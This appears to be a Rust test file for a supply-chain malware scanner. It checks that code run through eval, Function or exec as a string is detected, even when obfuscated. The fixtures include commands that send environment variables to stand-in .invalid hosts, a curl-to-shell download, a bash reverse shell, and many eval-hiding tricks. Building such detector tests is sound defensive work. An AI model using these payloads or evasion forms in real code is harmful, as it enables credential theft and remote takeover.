//! EVAL-LITERAL: the code a text hands an eval call as a string is read by the import-time and install-script tests
//! as a text of its own, found at the call's line; strings in strings are read `_EVAL_DEPTH` deep, a text that nests
//! them deeper is a cut (SC-TRUNCATED), never quiet; each string read is charged to the call's budget; a text that
//! ends inside a call is read without a panic. The texts are inert: nothing here is run; the hosts are `.invalid`.

use crate::budget;
use crate::json::Value;
use crate::pystr;

fn cps(s: &str) -> Vec<u32> {
    s.chars().map(|c| c as u32).collect()
}

const HARVEST: &str = "reads credentials or the whole environment and sends data over the network";
const NOTE: &str = " (in a string it runs as code)";
const SEND: &str = r#"fetch("https://c.invalid/x", { method: "POST", body: JSON.stringify(process.env) });"#;
const SEND_PY: &str = "import os, json, urllib.request\nurllib.request.urlopen('https://c.invalid/c', data=json.dumps(dict(os.environ)).encode())\n";

/// `code` as a JavaScript string literal in `quote` (its quotes and backslashes escaped, a line break as `\n`).
fn lit(code: &str, quote: char) -> String {
    let mut out = String::from(quote);
    for ch in code.chars() {
        match ch {
            '\\' => out.push_str("\\\\"),
            '\n' => out.push_str("\\n"),
            c if c == quote => {
                out.push('\\');
                out.push(c);
            }
            c => out.push(c),
        }
    }
    out.push(quote);
    out
}

/// `code` run by `depth` evals, one in another's string.
fn nested(code: &str, depth: usize) -> String {
    let mut text = code.to_string();
    for k in 0..depth {
        text = format!("eval({});", lit(&text, if k % 2 == 0 { '"' } else { '\'' }));
    }
    text
}

/// The import-time test as the registry asks it (`unread`): (reasons, line, the cut), or None when the call ran out.
fn import_unread(text: &str, lang: &str) -> (Vec<String>, Option<i64>, Option<String>) {
    let args = Value::obj(vec![("lang", Value::str(lang)), ("unread", Value::Bool(true))]);
    match crate::api::call("import_time_risk", &args, &cps(text)) {
        Ok(Value::Arr(a)) => (strings(&a[0]), a[1].as_i64(), a.get(3).and_then(|v| v.as_str()).map(pystr::to_string)),
        other => panic!("{other:?}"),
    }
}

/// The import-time test asked plainly: (reasons, line), or Err when the call answers as one that ran out.
fn import_plain(text: &str, lang: &str) -> Result<(Vec<String>, Option<i64>), crate::api::CallError> {
    let args = Value::obj(vec![("lang", Value::str(lang))]);
    crate::api::call("import_time_risk", &args, &cps(text)).map(|v| match v {
        Value::Arr(a) => (strings(&a[0]), a[1].as_i64()),
        other => panic!("{other:?}"),
    })
}

/// The install-script test of a script in `lang` (`unread`): (reasons, the cut).
fn install_unread(text: &str, lang: &str) -> (Vec<String>, Option<String>) {
    let args = Value::obj(vec![("lang", Value::str(lang)), ("unread", Value::Bool(true))]);
    match crate::api::call("install_script_risk", &args, &cps(text)) {
        Ok(Value::Arr(a)) => (strings(&a[0]), a[1].as_str().map(pystr::to_string)),
        other => panic!("{other:?}"),
    }
}

fn strings(v: &Value) -> Vec<String> {
    match v {
        Value::Arr(r) => r.iter().map(|x| pystr::to_string(x.as_str().unwrap())).collect(),
        other => panic!("{other:?}"),
    }
}

/// The JavaScript forms, each two lines below a benign head: (name, text).
fn js_forms() -> Vec<(&'static str, String)> {
    let head = "const path = require('path');\nmodule.exports = path.join('a', 'b');\n";
    let send_escaped = SEND.replace("fetch", "\\x66etch").replace("process", "\\u0070rocess").replace("env", "\\u{65}nv");
    let half = SEND.find("{ method").unwrap();
    let forms: Vec<(&'static str, String)> = vec![
        ("eval, double quotes, escaped quotes", format!("eval({});", lit(SEND, '"'))),
        ("eval, single quotes", format!("eval({});", lit(SEND, '\''))),
        ("eval, a template with no holes", format!("eval(`{SEND}`);")),
        ("eval, \\x \\u and \\u{{}} escapes", format!("eval(\"{}\");", send_escaped.replace('"', "\\\""))),
        ("eval, literals joined", format!("eval({} + {} + `\\n`);", lit(&SEND[..half], '\''), lit(&SEND[half..], '"'))),
        ("new Function", format!("new Function({})();", lit(SEND, '\''))),
        ("Function", format!("Function({})();", lit(SEND, '\''))),
        ("new Function, parameters before the body", format!("new Function('require', 'module', {})(require, module);", lit(SEND, '\''))),
        ("globalThis[\"ev\" + \"al\"]", format!("globalThis[\"ev\" + \"al\"]({});", lit(SEND, '\''))),
        ("window[\"eval\"]", format!("window[\"eval\"]({});", lit(SEND, '\''))),
        ("self[`Func` + `tion`]", format!("self[`Func` + `tion`]({})();", lit(SEND, '\''))),
        ("global[a name]", format!("const k = 'ev' + 'al';\nglobal[k]({});", lit(SEND, '\''))),
        ("(0, eval)", format!("(0, eval)({});", lit(SEND, '\''))),
        ("window.eval", format!("window.eval({});", lit(SEND, '\''))),
        ("eval?.", format!("eval?.({});", lit(SEND, '\''))),
        ("eval.call", format!("eval.call(null, {});", lit(SEND, '\''))),
        ("\\u0065val", format!("\\u0065val({});", lit(SEND, '\''))),
        ("eval, a comment before its (", format!("eval /* x */ ({});", lit(SEND, '\''))),
        ("eval in eval", nested(SEND, 2)),
    ];
    forms.into_iter().map(|(name, form)| (name, format!("{head}{form}\n"))).collect()
}

#[test]
fn each_form_is_found_at_its_calls_line() {
    let want = vec![format!("{HARVEST}{NOTE}")];
    for (name, text) in js_forms() {
        // (a name the text computes is on the line after the one that computes it)
        let line = if name == "global[a name]" { 4 } else { 3 };
        assert_eq!(import_unread(&text, "js"), (want.clone(), Some(line), None), "{name}");
    }
}

#[test]
fn before_it_was_quiet() {
    // the same text as a string no call runs: as quiet as it was (a string is not code)
    for text in [format!("const s = {};\nmodule.exports = s;\n", lit(SEND, '\'')), format!("// eval({})\n", lit(SEND, '\''))] {
        assert_eq!(import_unread(&text, "js"), (vec![], None, None), "{text}");
    }
}

#[test]
fn the_install_script_test_reads_it_too() {
    let (plain, _) = install_unread(&format!("{SEND}\n"), "js");
    assert!(!plain.is_empty());
    let want: Vec<String> = plain.iter().map(|r| format!("{r}{NOTE}")).collect();
    for (name, text) in js_forms() {
        assert_eq!(install_unread(&text, "js"), (want.clone(), None), "{name}");
    }
}

#[test]
fn python_exec_eval_compile_and_getattr() {
    let (plain, _, _) = import_unread(SEND_PY, "py");
    assert!(!plain.is_empty());
    let want: Vec<String> = plain.iter().map(|r| format!("{r}{NOTE}")).collect();
    let q = |code: &str| format!("'{}'", code.replace('\\', "\\\\").replace('\'', "\\'").replace('\n', "\\n"));
    let forms = [
        format!("exec({})", q(SEND_PY)),
        format!("exec(\"\"\"{SEND_PY}\"\"\")"),
        format!("exec(compile({}, '<s>', 'exec'))", q(SEND_PY)),
        format!("getattr(builtins, 'exec')({})", q(SEND_PY)),
        format!("__builtins__['exec']({})", q(SEND_PY)),
    ];
    for form in forms {
        // (the call on line 3)
        let text = format!("import sys\nimport builtins\n{form}\n");
        assert_eq!(import_unread(&text, "py"), (want.clone(), Some(3), None), "{form}");
    }
}

#[test]
fn benign_strings_run_as_code_are_quiet() {
    for code in [
        "eval(\"1+1\");",
        "new Function(\"a\", \"b\", \"return a+b\");",
        "var g = Function(\"return this\")();",
        "var o = eval(\"(\" + '{\"a\": 1, \"b\": [true, null]}' + \")\");",
        "var lib = new Function(\"exports\", \"var a=function(b){return b*2};exports.a=a;exports.v='1.0.0';\");",
        "module.exports = (0, eval)(\"this\");",
    ] {
        assert_eq!(import_unread(code, "js"), (vec![], None, None), "{code}");
        assert_eq!(install_unread(code, "js"), (vec![], None), "{code}");
    }
    assert_eq!(import_unread("x = eval('1 + 1')\ncode = compile('a = 1', '<s>', 'exec')\n", "py"), (vec![], None, None));
}

#[test]
fn what_the_text_finds_itself_stays() {
    // the text's own reason first, at its line; the string's beside it, at the call's
    let own = "const h = require('https');\nh.request({host: 'c.invalid', method: 'POST'}).end(JSON.stringify(process.env));\n";
    let shell = "require('child_process').execSync('\\x63url -s https://files.invalid/x | sh');";
    let (reasons, line, cut) = import_unread(&format!("{own}eval({});\n", lit(shell, '"')), "js");
    assert_eq!((reasons.len(), reasons[0].as_str(), line, cut), (2, HARVEST, Some(2), None), "{reasons:?}");
    assert!(reasons[1].starts_with("runs a downloaded script through a shell") && reasons[1].ends_with(NOTE), "{reasons:?}");
    // a reason the text gives itself is not given again for the string (exec("bash -i …"), read as Python, is a
    // reverse shell as the text, and as the string)
    assert_eq!(import_unread(&format!("{own}eval({});\n", lit(SEND, '\'')), "js"), (vec![HARVEST.to_string()], Some(2), None));
    let rev = "exec(\"bash -i >& /dev/tcp/192.0.2.1/4444 0>&1\")\n";
    assert_eq!(import_unread(rev, "py"), (vec!["opens a reverse shell".to_string()], Some(1), None));
}

#[test]
fn strings_in_strings_are_read_four_deep_and_deeper_is_a_cut() {
    for depth in 1..=4 {
        assert_eq!(import_unread(&nested(SEND, depth), "js"), (vec![format!("{HARVEST}{NOTE}")], Some(1), None), "{depth}");
    }
    let words = "the strings eval calls run as code are read 4 deep (_EVAL_DEPTH), and this text nests them deeper";
    let deep = nested(SEND, 5);
    assert_eq!(import_unread(&deep, "js"), (vec![], None, Some(words.to_string())));
    // asked plainly, the call answers as one that ran out: the file is SC-TRUNCATED in those words
    assert!(matches!(import_plain(&deep, "js"), Err(crate::api::CallError::Exhausted)));
    assert_eq!(budget::last_cut().as_deref(), Some(words));
    assert_eq!(install_unread(&deep, "js"), (vec![], Some(words.to_string())));
    // a benign string as deep is a cut all the same: what is not read is never quiet
    assert_eq!(import_unread(&nested("1 + 1", 5), "js").2.as_deref(), Some(words));
    assert_eq!(import_unread(&nested("1 + 1", 4), "js"), (vec![], None, None));
}

#[test]
fn each_string_read_is_charged_to_the_calls_budget() {
    let p = crate::pack::current();
    let spent = |text: &str, lang: &str| {
        let t = cps(text);
        budget::reset(budget::DEFAULT_STEPS);
        let _ = crate::signs::import_time_risk(&p, &t, Some(lang));
        budget::DEFAULT_STEPS - budget::state().0
    };
    // a step a character, and the reading itself (F-2: the whole test runs on each string, which its length did not
    // cover)
    let body = "var a = 1;\n".repeat(20_000);
    let text = format!("eval({});\n", lit(&body, '\''));
    let read = spent(&text, "js");
    let unread = spent(&format!("evil({});\n", lit(&body, '\'')), "js");
    assert!(read >= unread + body.len() as u64 + crate::signs::EVAL_STRING_STEPS_JS, "{read} {unread}");
    let body_py = "a = 1\n".repeat(20_000);
    let read = spent(&format!("exec({})\n", lit(&body_py, '\'')), "py");
    let unread = spent(&format!("evil({})\n", lit(&body_py, '\'')), "py");
    assert!(read >= unread + body_py.len() as u64 + crate::signs::EVAL_STRING_STEPS_PY, "{read} {unread}");
    // and a call with a step too few for it runs out (each call below reads the text as the one before it left it:
    // its trees' and decoded view's readings kept)
    let _ = spent(&text, "js");
    let need = spent(&text, "js");
    let t = cps(&text);
    let call = |steps: u64| budget::call_with(steps, || crate::signs::import_time_risk(&p, &t, Some("js"))).map(|_| ());
    assert_eq!(call(need), Ok(()));
    assert_eq!(call(need - 1), Err(budget::Exhausted));
    // so a text of many strings runs out rather than on: 100 short ones need 100 readings' steps
    let many: String = (0..100).map(|i| format!("eval('var a{i} = {i};');\n")).collect();
    let t = cps(&many);
    let call = |steps: u64| budget::call_with(steps, || crate::signs::import_time_risk(&p, &t, Some("js"))).map(|_| ());
    assert_eq!(call(100 * crate::signs::EVAL_STRING_STEPS_JS), Err(budget::Exhausted));
    assert_eq!(call(102 * crate::signs::EVAL_STRING_STEPS_JS), Ok(()));
    budget::reset(budget::DEFAULT_STEPS);
}

#[test]
fn a_string_only_the_decoded_view_hands_a_call() {
    // a proxy object's call (control-flow flattening's), which the decoded view reads as the call it stands for,
    // `eval('…')`: the text itself hands no call a string
    let head = "const path = require('path');\nmodule.exports = path.join('a', 'b');\n";
    let text = format!("{head}const o={{'oEnxQ':function(f,a){{return f(a);}}}};\no['oEnxQ'](eval,{});\n", lit(SEND, '\''));
    let p = crate::pack::current();
    assert!(crate::evalcode::codes(&p, &cps(&text), "js").is_empty());
    let dv = pystr::to_string(&p.text("_DV_NOTE"));
    assert_eq!(import_unread(&text, "js"), (vec![format!("{HARVEST}{NOTE}{dv}")], Some(4), None));
    let (plain, _) = install_unread(&format!("{SEND}\n"), "js");
    assert_eq!(install_unread(&text, "js"), (plain.iter().map(|r| format!("{r}{NOTE}{dv}")).collect(), None));
    // a string the text hands a call itself is given once, without the view's note
    let both = format!("{text}eval({});\n", lit(SEND, '\''));
    assert_eq!(import_unread(&both, "js"), (vec![format!("{HARVEST}{NOTE}")], Some(5), None));
}

#[test]
fn calls_nested_deeper_than_the_tree_reads_answer_with_its_cut() {
    // (F-4) `eval(` or `window[` nested 100,000 deep: each call's arguments read once, the call answers at once with
    // the tree's cut, as it did before EVAL-LITERAL (a walk of each call to its end spent the whole budget)
    let tree = "the supply-chain tree did not read it whole: the parser refused it at line 1 (nesting too deep); its text alone was read for what it sends";
    let eval = format!("{}x{}", "eval(".repeat(100_000), ")".repeat(100_000));
    let window = format!("{}k{}('a');\n", "window[".repeat(100_000), "]".repeat(100_000));
    for text in [eval, window] {
        assert_eq!(import_unread(&text, "js"), (vec![], None, Some(tree.to_string())), "{}", &text[..8]);
        assert_eq!(install_unread(&text, "js"), (vec![], Some(tree.to_string())), "{}", &text[..8]);
        assert!(matches!(import_plain(&text, "js"), Err(crate::api::CallError::Exhausted)));
        assert_eq!(budget::last_cut().as_deref(), Some(tree));
    }
}

#[test]
fn a_text_that_ends_inside_the_call_is_read() {
    for text in ["eval(", "eval(\"", "eval('a'", "eval('a' +", "x = eval", "new Function('a', ", "globalThis[\"ev\" + ", "window['eval'](", "eval(\n"] {
        assert_eq!(import_plain(text, "js").ok(), Some((vec![], None)), "{text:?}");
        assert_eq!(install_unread(text, "js"), (vec![], None), "{text:?}");
    }
    for text in ["exec(", "exec('a'", "getattr(builtins, 'exec')(", "exec('''"] {
        assert_eq!(import_plain(text, "py").ok(), Some((vec![], None)), "{text:?}");
        assert_eq!(install_unread(text, "py"), (vec![], None), "{text:?}");
    }
}
